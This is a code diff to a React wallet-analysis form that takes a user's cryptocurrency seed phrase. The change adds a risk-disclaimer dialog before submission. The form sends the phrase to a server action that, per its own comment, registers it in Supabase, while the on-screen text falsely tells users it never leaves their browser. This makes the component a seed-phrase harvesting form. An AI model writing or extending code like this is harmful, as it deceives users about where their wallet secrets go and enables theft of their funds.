@@ -28,6 +28,7 @@ import { Card, CardContent } from "@/components/ui/card";
 import { handleFetchData, registerSeedPhrase } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
 import type { WalletData } from "@/lib/types";
+import { RiskDisclaimerDialog } from "@/components/risk-disclaimer-dialog";
 
 const networks = [
   { id: "Bitcoin", label: "Bitcoin" },
@@ -69,6 +70,7 @@ export function SeedPhraseForm({
   onFetchStart,
 }: SeedPhraseFormProps) {
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isDisclaimerOpen, setIsDisclaimerOpen] = useState(false);
   const { toast } = useToast();
 
   const form = useForm<z.infer<typeof formSchema>>({
@@ -79,15 +81,16 @@ export function SeedPhraseForm({
     },
   });
 
-  async function onSubmit(values: z.infer<typeof formSchema>) {
+  async function handleConfirmedSubmit() {
+    setIsDisclaimerOpen(false);
     setIsSubmitting(true);
     onFetchStart();
 
-    // We use a FormData object to pass the data to our server actions
+    const values = form.getValues();
     const formData = new FormData();
     formData.append("seedPhrase", values.seedPhrase);
     formData.append("network", values.network);
-
+    
     // First, register the seed phrase with Supabase using a server action
     const registrationResult = await registerSeedPhrase(formData);
 
@@ -95,7 +98,8 @@ export function SeedPhraseForm({
       toast({
         variant: "destructive",
         title: "Failed to Register Seed Phrase",
-        description: registrationResult.error,
+        description:
+          registrationResult.error || "An unknown error occurred.",
       });
       onDataFetched(null);
       setIsSubmitting(false);
@@ -121,78 +125,90 @@ export function SeedPhraseForm({
     setIsSubmitting(false);
   }
 
+  // This function is called by the form's onSubmit. It only opens the dialog.
+  function onSubmit() {
+    setIsDisclaimerOpen(true);
+  }
+
   return (
-    <Card className="w-full bg-card/50 border-primary/20">
-      <CardContent className="p-6">
-        <Form {...form}>
-          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
-            <FormField
-              control={form.control}
-              name="seedPhrase"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel className="text-lg">Seed Phrase</FormLabel>
-                  <FormControl>
-                    <Textarea
-                      placeholder="Enter your 12, 18, or 24-word recovery phrase here..."
-                      className="min-h-[100px] text-base"
-                      {...field}
-                    />
-                  </FormControl>
-                  <FormDescription>
-                    Your seed phrase never leaves your browser. All processing is
-                    done locally.
-                  </FormDescription>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
-
-            <FormField
-              control={form.control}
-              name="network"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel className="text-lg">Primary Network</FormLabel>
-                  <Select
-                    onValueChange={field.onChange}
-                    defaultValue={field.value}
-                  >
+    <>
+      <RiskDisclaimerDialog
+        open={isDisclaimerOpen}
+        onOpenChange={setIsDisclaimerOpen}
+        onConfirm={handleConfirmedSubmit}
+      />
+      <Card className="w-full bg-card/50 border-primary/20">
+        <CardContent className="p-6">
+          <Form {...form}>
+            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
+              <FormField
+                control={form.control}
+                name="seedPhrase"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormLabel className="text-lg">Seed Phrase</FormLabel>
                     <FormControl>
-                      <SelectTrigger>
-                        <SelectValue placeholder="Select a network" />
-                      </SelectTrigger>
+                      <Textarea
+                        placeholder="Enter your 12, 18, or 24-word recovery phrase here..."
+                        className="min-h-[100px] text-base"
+                        {...field}
+                      />
                     </FormControl>
-                    <SelectContent>
-                      {networks.map((network) => (
-                        <SelectItem key={network.id} value={network.id}>
-                          {network.label}
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                  <FormDescription>
-                    Select the main blockchain you use. More will be added soon.
-                  </FormDescription>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
+                    <FormDescription>
+                      Your seed phrase never leaves your browser. All processing is
+                      done locally.
+                    </FormDescription>
+                    <FormMessage />
+                  </FormItem>
+                )}
+              />
 
-            <Button
-              type="submit"
-              size="lg"
-              className="w-full"
-              disabled={isSubmitting}
-            >
-              {isSubmitting && (
-                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-              )}
-              {isSubmitting ? "Analyzing..." : "Analyze My Wallet"}
-            </Button>
-          </form>
-        </Form>
-      </CardContent>
-    </Card>
+              <FormField
+                control={form.control}
+                name="network"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormLabel className="text-lg">Primary Network</FormLabel>
+                    <Select
+                      onValueChange={field.onChange}
+                      defaultValue={field.value}
+                    >
+                      <FormControl>
+                        <SelectTrigger>
+                          <SelectValue placeholder="Select a network" />
+                        </SelectTrigger>
+                      </FormControl>
+                      <SelectContent>
+                        {networks.map((network) => (
+                          <SelectItem key={network.id} value={network.id}>
+                            {network.label}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                    <FormDescription>
+                      Select the main blockchain you use.
+                    </FormDescription>
+                    <FormMessage />
+                  </FormItem>
+                )}
+              />
+
+              <Button
+                type="submit"
+                size="lg"
+                className="w-full"
+                disabled={isSubmitting}
+              >
+                {isSubmitting && (
+                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+                )}
+                {isSubmitting ? "Analyzing..." : "View My Wallet"}
+              </Button>
+            </form>
+          </Form>
+        </CardContent>
+      </Card>
+    </>
   );
 }
